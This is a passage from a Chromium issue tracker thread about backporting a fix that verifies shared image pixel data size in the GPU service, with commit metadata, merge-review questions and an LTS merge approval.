    Reviewed-by: Victor Gabriel Savu <vsavu@google.com> 
    Commit-Queue: Gyuyoung Kim (xWF) <qkim@google.com> 
    Reviewed-by: Kyle Charbonneau <kylechar@chromium.org> 
    Owners-Override: Victor Gabriel Savu <vsavu@google.com> 
    Cr-Commit-Position: refs/branch-heads/7204@{#3512} 
    Cr-Branched-From: d5de512dc9dc8ddfe4e6d71b0637578bb6158683-refs/heads/main@{#1465706}

```

---

Files:

- M `gpu/ipc/service/shared_image_stub.cc`

---

Hash: [f35ac32d66b68cd1791e07ea2eb1a29309f27d10](https://chromiumdash.appspot.com/commit/f35ac32d66b68cd1791e07ea2eb1a29309f27d10)  

Date: Thu Apr 2 02:38:45 2026


---

### pe...@google.com (2026-04-10)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-04-10)

1. https://chromium-review.git.corp.google.com/c/chromium/src/+/7690928
2. Low - There was no conflict.
3. 146
4. Yes, the issue has existed since 2018 according to the bug description.

### an...@google.com (2026-04-10)

Merge approved for LTS-144.

### dx...@google.com (2026-04-13)

Project: chromium/src  

Branch:  refs/branch-heads/7559  

Author:  kylechar [kylechar@chromium.org](mailto:kylechar@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7690928>

[M144-LTS] Verify shared image pixel size

---


Expand for full commit details
```
     
    Ensure that pixel data size makes sense based on the format+size of the 
    shared image in SharedImageStub. 
     
    (cherry picked from commit 6345b520b1887709d3f21260a54c916b297453db) 
     
    Bug: 488270257 
    Change-Id: Ic98123443c047ec605274212e53ee278fdcc264c 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7623536 
    Reviewed-by: Vasiliy Telezhnikov <vasilyt@chromium.org> 
    Commit-Queue: Kyle Charbonneau <kylechar@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1592603} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7690928 
    Reviewed-by: Kyle Charbonneau <kylechar@chromium.org> 
    Reviewed-by: Michael Ershov <miersh@google.com> 
    Cr-Commit-Position: refs/branch-heads/7559@{#4815} 
    Cr-Branched-From: 223dfbac1c7542a06b422390d954afe5b560b607-refs/heads/main@{#1552494}

```

---

Files:

- M `gpu/ipc/service/shared_image_stub.cc`

---

Hash: [ae195b869ed744c541656f5108eb4b9d362409f1](https://chromiumdash.appspot.com/commit/ae195b869ed744c541656f5108eb4b9d362409f1)  

Date: Mon Apr 13 15:02:13 2026


---

### ch...@google.com (2026-06-20)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/488270257)*
